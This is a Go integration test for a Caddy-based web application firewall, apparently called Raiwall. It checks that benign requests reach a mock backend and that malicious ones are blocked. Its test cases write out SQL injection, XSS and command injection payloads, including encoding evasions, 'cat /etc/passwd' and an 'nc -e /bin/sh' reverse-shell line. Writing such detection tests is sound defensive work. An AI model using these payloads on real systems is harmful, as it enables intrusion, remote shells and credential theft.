//go:build integration

package e2e

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/caddyserver/caddy/v2"
	"github.com/Panharoth06/raiwall/pkg/config"
	"github.com/Panharoth06/raiwall/pkg/proxy"
)

func TestEndToEndSemanticWAF(t *testing.T) {
	config.StoreSnapshot(config.NewConfigSnapshot(100, config.ModeDefense, nil))
	t.Cleanup(func() {
		config.StoreSnapshot(config.NewConfigSnapshot(0, config.ModeDefense, nil))
	})

	// 1. Mock upstream protected backend
	backendMux := http.NewServeMux()
	backendMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"success","message":"backend reached"}`))
	})

	// 2. Setup Raiwall Middleware with SemanticEngine by default
	mw := &proxy.Middleware{
		Mode:            "defense",
		BlockStatusCode: http.StatusForbidden,
	}

	caddyCtx, cancel := caddy.NewContext(caddy.Context{Context: context.Background()})
	defer cancel()

	if err := mw.Provision(caddyCtx); err != nil {
		t.Fatalf("failed to provision middleware: %v", err)
	}

	next := &e2eNextHandler{handler: backendMux}

	// 3. Test Cases for Threats and Evasions
	tests := []struct {
		name          string
		method        string
		path          string
		query         string
		headers       http.Header
		body          []byte
		expectedBlock bool
	}{
		// --- Benign Requests ---
		{
			name:          "Benign GET request with standard query params",
			method:        "GET",
			path:          "/api/v1/products",
			query:         "category=electronics&page=1&limit=20&sort=asc",
			expectedBlock: false,
		},
		{
			name:   "Benign POST JSON request",
			method: "POST",
			path:   "/api/v1/orders",
			headers: http.Header{
				"Content-Type": []string{"application/json"},
			},
			body:          []byte(`{"item_id": 42, "quantity": 3, "notes": "Please deliver between 9am-5pm"}`),
			expectedBlock: false,
		},
		{
			name:   "Benign form URL encoded",
			method: "POST",
			path:   "/contact",
			headers: http.Header{
				"Content-Type": []string{"application/x-www-form-urlencoded"},
			},
			body:          []byte("name=Jane+Doe&email=jane%40example.com&message=Hello+support+team"),
			expectedBlock: false,
		},

		// --- SQL Injection Vectors ---
		{
			name:          "SQLi in GET query parameter",
			method:        "GET",
			path:          "/users",
			query:         "id=1'%20OR%20'1'='1",
			expectedBlock: true,
		},
		{
			name:   "SQLi in POST JSON body",
			method: "POST",
			path:   "/login",
			headers: http.Header{
				"Content-Type": []string{"application/json"},
			},
			body:          []byte(`{"username": "admin' --", "password": "password123"}`),
			expectedBlock: true,
		},
		{
			name:   "SQLi in POST form body",
			method: "POST",
			path:   "/search",
			headers: http.Header{
				"Content-Type": []string{"application/x-www-form-urlencoded"},
			},
			body:          []byte("query=1+UNION+SELECT+1%2C2%2C3"),
			expectedBlock: true,
		},
		{
			name:   "SQLi in Cookie Header",
			method: "GET",
			path:   "/dashboard",
			headers: http.Header{
				"Cookie": []string{"session_id=valid123; user_role=10' OR 1=1 --"},
			},
			expectedBlock: true,
		},

		// --- Command Injection Vectors ---
		{
			name:          "CmdI with semicolon and system command in query",
			method:        "GET",
			path:          "/ping",
			query:         "host=127.0.0.1;%20cat%20/etc/passwd",
			expectedBlock: true,
		},
		{
			name:   "CmdI with command substitution in JSON body",
			method: "POST",
			path:   "/api/deploy",
			headers: http.Header{
				"Content-Type": []string{"application/json"},
			},
			body:          []byte(`{"version": "$(whoami)"}`),
			expectedBlock: true,
		},
		{
			name:   "CmdI with pipeline in Header",
			method: "GET",
			path:   "/status",
			headers: http.Header{
				"X-Custom-Env": []string{"test | nc -e /bin/sh 10.0.0.1 4444"},
			},
			expectedBlock: true,
		},
		{
			name:   "CmdI with backticks in form body",
			method: "POST",
			path:   "/admin/run",
			headers: http.Header{
				"Content-Type": []string{"application/x-www-form-urlencoded"},
			},
			body:          []byte("cmd=`id`"),
			expectedBlock: true,
		},

		// --- Cross-Site Scripting (XSS) Vectors ---
		{
			name:          "XSS with script tag in GET query",
			method:        "GET",
			path:          "/search",
			query:         "q=%3Cscript%3Ealert(1)%3C/script%3E",
			expectedBlock: true,
		},
		{
			name:          "XSS attribute breakout in query",
			method:        "GET",
			path:          "/items",
			query:         "color=\"%20onerror=alert(1)",
			expectedBlock: true,
		},
		{
			name:   "XSS with iframe in JSON body",
			method: "POST",
			path:   "/comments",
			headers: http.Header{
				"Content-Type": []string{"application/json"},
			},
			body:          []byte(`{"text": "\"><iframe src=\"https://evil.com\"></iframe>"}`),
			expectedBlock: true,
		},
		{
			name:          "XSS with javascript pseudo-protocol",
			method:        "GET",
			path:          "/redirect",
			query:         "url=javascript:alert(document.cookie)",
			expectedBlock: true,
		},

		// --- Evasion Vectors ---
		{
			name:          "Evasion: Double URL encoded SQLi",
			method:        "GET",
			path:          "/catalog",
			query:         "cat=%2527%2520UNION%2520SELECT%25201,2,3--",
			expectedBlock: true,
		},
		{
			name:   "Evasion: Inline SQL comment evasion in JSON body",
			method: "POST",
			path:   "/auth",
			headers: http.Header{
				"Content-Type": []string{"application/json"},
			},
			body:          []byte(`{"user": "admin'/**/OR/**/1=1--"}`),
			expectedBlock: true,
		},
		{
			name:          "Evasion: HTML entity encoded XSS",
			method:        "GET",
			path:          "/view",
			query:         "val=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
			expectedBlock: true,
		},
		{
			name:          "Evasion: Mixed-case and encoded command injection",
			method:        "GET",
			path:          "/exec",
			query:         "file=test%3B%20%24%28wHoAmI%29",
			expectedBlock: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			targetURL := "http://example.com" + tc.path
			if tc.query != "" {
				targetURL += "?" + tc.query
			}

			var bodyReader *bytes.Reader
			if len(tc.body) > 0 {
				bodyReader = bytes.NewReader(tc.body)
			} else {
				bodyReader = bytes.NewReader([]byte{})
			}

			req := httptest.NewRequest(tc.method, targetURL, bodyReader)
			req.RemoteAddr = "198.51.100.50:54321"

			for k, vv := range tc.headers {
				for _, v := range vv {
					req.Header.Add(k, v)
				}
			}

			rec := httptest.NewRecorder()
			err := mw.ServeHTTP(rec, req, next)
			if err != nil {
				t.Fatalf("ServeHTTP error: %v", err)
			}

			if tc.expectedBlock {
				if rec.Code != http.StatusForbidden {
					t.Errorf("expected status 403 Forbidden for %q, got %d", tc.name, rec.Code)
				}
				if rec.Header().Get("X-Raiwall-Event-ID") == "" {
					t.Errorf("expected X-Raiwall-Event-ID header on blocked response")
				}
				if !strings.Contains(rec.Body.String(), "Request Blocked") {
					t.Errorf("expected block HTML body, got: %s", rec.Body.String())
				}
			} else {
				if rec.Code != http.StatusOK {
					t.Errorf("expected status 200 OK for %q, got %d", tc.name, rec.Code)
				}
				if !strings.Contains(rec.Body.String(), "backend reached") {
					t.Errorf("expected backend response, got: %s", rec.Body.String())
				}
			}
		})
	}

	// 4. Concurrency & Race Detector Test
	t.Run("Concurrent Mixed Traffic Race Test", func(t *testing.T) {
		const numRequests = 100
		var wg sync.WaitGroup
		wg.Add(numRequests)

		for i := 0; i < numRequests; i++ {
			go func(idx int) {
				defer wg.Done()
				var req *http.Request
				expectBlock := (idx % 2 == 0)

				if expectBlock {
					req = httptest.NewRequest("GET", "http://example.com/search?q=1'%20OR%20'1'='1", nil)
				} else {
					req = httptest.NewRequest("GET", "http://example.com/products?page=1&sort=desc", nil)
				}
				req.RemoteAddr = "198.51.100.77:12345"

				rec := httptest.NewRecorder()
				_ = mw.ServeHTTP(rec, req, next)

				if expectBlock && rec.Code != http.StatusForbidden {
					t.Errorf("concurrent request %d: expected 403, got %d", idx, rec.Code)
				}
				if !expectBlock && rec.Code != http.StatusOK {
					t.Errorf("concurrent request %d: expected 200, got %d", idx, rec.Code)
				}
			}(i)
		}

		wg.Wait()
	})
}
